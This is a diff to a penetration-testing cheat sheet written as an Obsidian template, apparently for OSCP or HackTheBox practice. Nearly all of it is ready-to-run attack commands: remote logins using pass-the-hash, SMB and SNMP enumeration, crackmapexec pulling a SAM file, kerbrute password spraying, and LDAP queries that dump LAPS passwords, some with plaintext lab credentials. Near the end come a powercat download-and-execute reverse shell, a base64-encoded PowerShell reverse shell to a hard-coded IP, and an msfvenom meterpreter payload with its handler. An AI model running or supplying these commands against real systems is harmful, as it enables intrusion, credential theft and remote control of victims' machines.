@@ -273,14 +273,19 @@ curl -X 'PUT' \
 
 
 # evil-winrm
+```bash
 evil-winrm -i <% tp.frontmatter["RHOST"] %> -u '<% tp.frontmatter["USERNAME"] %>' -p '<% tp.frontmatter["PASSWORD"] %>'
 evil-winrm -i <% tp.frontmatter["RHOST"] %> -u '<% tp.frontmatter["USERNAME"] %>' -H ''
+```
 
 # xfreerdp
+```bash
 xfreerdp /v:<% tp.frontmatter["RHOST"] %> /u:<% tp.frontmatter["USERNAME"] %> /p:<% tp.frontmatter["PASSWORD"] %> /dynamic-resolution +clipboard
 xfreerdp /v:<% tp.frontmatter["RHOST"] %> /u:<% tp.frontmatter["USERNAME"] %> /d:<% tp.frontmatter["DOMAIN"] %> /pth:'<HASH>' /dynamic-resolution +clipboard
+```
 
 # smbclient
+```bash
 smbclient -L \\<% tp.frontmatter["RHOST"] %>\ -N
 smbclient -L //<% tp.frontmatter["RHOST"] %>/ -N
 smbclient -L ////<% tp.frontmatter["RHOST"] %>/ -N
@@ -298,9 +303,10 @@ mask""
 recurse ON
 prompt OFF
 mget *
-
+```
 
 # snmpwalk 
+```bash
 snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %>
 snmpwalk -v2c -c public <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.4.34.1.3
 snmpwalk -v2c -c public <% tp.frontmatter["RHOST"] %> .1
@@ -320,11 +326,10 @@ snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.25.6.3.1.2
 1.3.6.1.2.1.25.6.3.1.2 Software Name
 1.3.6.1.4.1.77.1.2.25 User Accounts
 1.3.6.1.2.1.6.13.1.3 TCP Local Ports
-
-
-# crackmapexec (DOWNLOAD FILE LIKE THIS!!!! WOW)
+```
 
 # Dont forget to use
+```bash
 --local-auth
 crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --pass-pol
 crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --shares
@@ -336,16 +341,18 @@ crackmapexec mssql <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME
 crackmapexec mssql 10.10.85.148 -u sql_svc -p Dolphin1 -d oscp.exam --get-file "C:\TEMP\SAM" SAM
 crackmapexec winrm <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
 crackmapexec winrm <% tp.frontmatter["RHOST"] %>  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
-
+```
 
 # Kerbrute
+```bash
 ./kerbrute userenum -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES>
 ./kerbrute passwordspray -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES> <% tp.frontmatter["PASSWORD"] %>
+```
 
 
 #ldap
+```bash
 ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec'
-
 ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 
 
@@ -359,12 +366,9 @@ ldapsearch -x -H ldap://<% tp.frontmatter["RHOST"] %> -D "<% tp.frontmatter["USE
 ldapsearch -H ldap://<% tp.frontmatter["DOMAIN"] %> -b "DC=<% tp.frontmatter["DOMAIN"] %>,DC=local" > <FILE>.txt
 
 <examples>
-
 ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt
 ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
-
-<examples>
-
+```
 
 # Get computers
 python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --computers
@@ -379,23 +383,32 @@ python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatt
 
 
 #powercat
+```bash
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<% tp.frontmatter["LHOST"] %>/powercat.ps1');powercat -c <% tp.frontmatter["LHOST"] %> -p <LPORT> -e cmd"
 "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AOAA1AC4AMQA0ADcAJwAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+```
 
 #adpeas
+```bash
 Import-Module .\adPEAS.ps1
 . .\adPEAS.ps1
 Invoke-adPEAS
 Invoke-adPEAS -Domain '<% tp.frontmatter["DOMAIN"] %>' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor
+```
 
 #### Certipy
+```bash
 certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["DOMAIN"] %> -p <% tp.frontmatter["PASSWORD"] %>
 certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERNAME"] %> -p <% tp.frontmatter["PASSWORD"] %> -vulnerable -stdout
+```
 
 #rpcclient
+```bash
 rpcclient -U "" <% tp.frontmatter["RHOST"] %>
+```
 
 # msfvenom && metasploit execution
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
 
 msf6 > use exploit/multi/handler
@@ -406,7 +419,6 @@ msf6 exploit(multi/handler) > run
 
 .\exploit.exe
 ```
-
 
 ## Pivoting
 ```bash
